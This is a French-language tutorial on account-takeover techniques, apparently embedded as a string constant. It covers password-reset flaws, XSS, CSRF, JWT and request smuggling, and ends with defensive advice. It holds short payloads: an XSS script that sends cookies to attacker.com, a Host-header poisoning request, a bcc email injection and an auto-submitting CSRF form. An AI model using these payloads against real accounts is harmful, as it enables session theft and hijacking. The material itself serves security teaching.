CONTENT = """\nACCOUNT TAKEOVER (ATO) - PRISE DE CONTRÔLE DE COMPTE

Définition pédagogique :

La prise de contrôle de compte (Account Takeover) est une attaque où un attaquant accède au compte d’un utilisateur sans autorisation. Cela peut se faire via des failles techniques, des erreurs de logique ou des mécanismes mal sécurisés.

Objectif de l’attaquant :
Accéder aux données, modifier le mot de passe, usurper l’identité ou exploiter le compte (fraude, spam, etc.).


==================================================
PARTIE 1 : FONCTIONNALITÉ DE RÉINITIALISATION DE MOT DE PASSE
==================================================

Cette fonctionnalité est une des cibles principales car elle permet de changer le mot de passe sans connaître l’ancien.


--------------------------------------------------
Fuite du token de réinitialisation via le Referer
--------------------------------------------------

Explication :

Quand un utilisateur clique sur un lien de réinitialisation, le navigateur peut envoyer l’URL complète (incluant le token) dans l’en-tête "Referer" vers un site tiers.

Si ce token est exposé, un attaquant peut l’utiliser pour réinitialiser le mot de passe.

Exemple concret :

1. Tu demandes une réinitialisation de mot de passe
2. Tu reçois un lien comme :
   https://example.com/reset?token=ABC123
3. Tu cliques sur un lien externe (Facebook, etc.)
4. Le navigateur envoie :
   Referer: https://example.com/reset?token=ABC123
5. L’attaquant récupère ce token via un proxy comme Burp Suite


--------------------------------------------------
Empoisonnement de réinitialisation (Password Reset Poisoning)
--------------------------------------------------

Explication :

L’attaquant modifie les en-têtes HTTP (comme Host) pour forcer le serveur à générer un lien de réinitialisation avec un domaine contrôlé par l’attaquant.

Exemple concret :

Requête modifiée :

POST /reset.php
Host: attacker.com

Résultat :
Le serveur envoie un email contenant :
https://attacker.com/reset-password?token=XYZ

L’utilisateur clique dessus → le token est envoyé à l’attaquant


--------------------------------------------------
Réinitialisation via paramètre email
--------------------------------------------------

Explication :

Certains systèmes acceptent plusieurs emails dans un même paramètre, ce qui permet d’envoyer le lien à la victime ET à l’attaquant.

Exemples :

email=victim@mail.com&email=hacker@mail.com

ou

email=victim@mail.com,hacker@mail.com

ou injection :

email=victim@mail.com%0Abcc:hacker@mail.com

Résultat :
L’attaquant reçoit aussi le lien de réinitialisation


--------------------------------------------------
IDOR sur API (Insecure Direct Object Reference)
--------------------------------------------------

Explication :

L’API permet de modifier des données sensibles sans vérifier correctement l’identité de l’utilisateur.

Exemple concret :

Requête :

POST /api/changepass
email=victim@mail.com
password=newpass

Si aucune vérification n’est faite, l’attaquant peut changer le mot de passe d’un autre utilisateur


--------------------------------------------------
Token de réinitialisation faible
--------------------------------------------------

Explication :

Un token doit être aléatoire, unique et temporaire. Sinon, il peut être deviné.

Faiblesses possibles :

- Token trop court
- Basé sur l’heure (timestamp)
- Réutilisable
- Pas d’expiration

Exemple concret :

Token = 123456

Un attaquant peut tester toutes les combinaisons (bruteforce)


--------------------------------------------------
Fuite du token dans la réponse serveur
--------------------------------------------------

Explication :

Parfois, le serveur renvoie directement le token dans sa réponse (API ou HTML).

Exemple :

Réponse JSON :

{
  "resetToken": "ABC123"
}

L’attaquant peut utiliser ce token directement dans une URL :

https://example.com/reset?token=ABC123&email=victim@mail.com


--------------------------------------------------
Collision de nom d’utilisateur
--------------------------------------------------

Explication :

Deux comptes peuvent être considérés comme identiques à cause d’espaces ou de normalisation.

Exemple :

Victime : "admin"
Attaquant : "admin "

Le système traite les deux comme identiques.

Attaque :

1. L’attaquant crée "admin "
2. Il demande un reset
3. Il reçoit le token
4. Il modifie le mot de passe du vrai "admin"


--------------------------------------------------
Problème de normalisation Unicode
--------------------------------------------------

Explication :

Certains caractères Unicode ressemblent à des caractères normaux mais sont différents.

Exemple :

Victime : demo@gmail.com
Attaquant : demⓞ@gmail.com

Le système peut confondre les deux.

Résultat :
Collision → prise de contrôle


==================================================
PARTIE 2 : ATO VIA VULNÉRABILITÉS WEB
==================================================


--------------------------------------------------
Account Takeover via XSS
--------------------------------------------------

Explication :

Une faille XSS permet d’exécuter du JavaScript dans le navigateur de la victime.

Objectif :
Voler les cookies de session

Exemple concret :

<script>
fetch("http://attacker.com?cookie=" + document.cookie)
</script>

Résultat :
L’attaquant récupère le cookie et se connecte comme la victime


--------------------------------------------------
Account Takeover via HTTP Request Smuggling
--------------------------------------------------

Explication :

Manipulation des requêtes HTTP pour tromper le serveur et injecter une requête cachée.

Exemple concret :

Une requête est envoyée avec deux interprétations différentes (CL vs TE)

Résultat :
Une requête malveillante est exécutée à la place d’une autre


--------------------------------------------------
Account Takeover via CSRF
--------------------------------------------------

Explication :

Une attaque CSRF force un utilisateur connecté à exécuter une action sans le savoir.

Exemple concret :

Un attaquant envoie une page HTML contenant :

<form action="https://example.com/change-password" method="POST">
<input type="hidden" name="password" value="hacked123">
</form>

<script>document.forms[0].submit()</script>

Si la victime est connectée → mot de passe changé


--------------------------------------------------
Account Takeover via JWT
--------------------------------------------------

Explication :

Les JSON Web Tokens sont utilisés pour l’authentification.

Failles possibles :

- Signature faible
- Données modifiables

Exemple concret :

Token décodé :

{
  "email": "user@mail.com"
}

Attaquant modifie en :

{
  "email": "admin@mail.com"
}

Si la signature n’est pas vérifiée → accès admin


==================================================
CONCLUSION
==================================================

La prise de contrôle de compte repose souvent sur :

- Mauvaise gestion des tokens
- Absence de vérification d’identité
- Mauvaise validation des entrées
- Vulnérabilités web classiques (XSS, CSRF)

Bonnes pratiques :

- Tokens forts, uniques et expirables
- Vérification stricte des utilisateurs
- Protection contre XSS et CSRF
- Validation des entrées utilisateur
- Logs et détection d’anomalies

Objectif en cybersécurité :

Toujours penser comme un attaquant pour identifier les points faibles avant qu’ils ne soient exploités.\n"""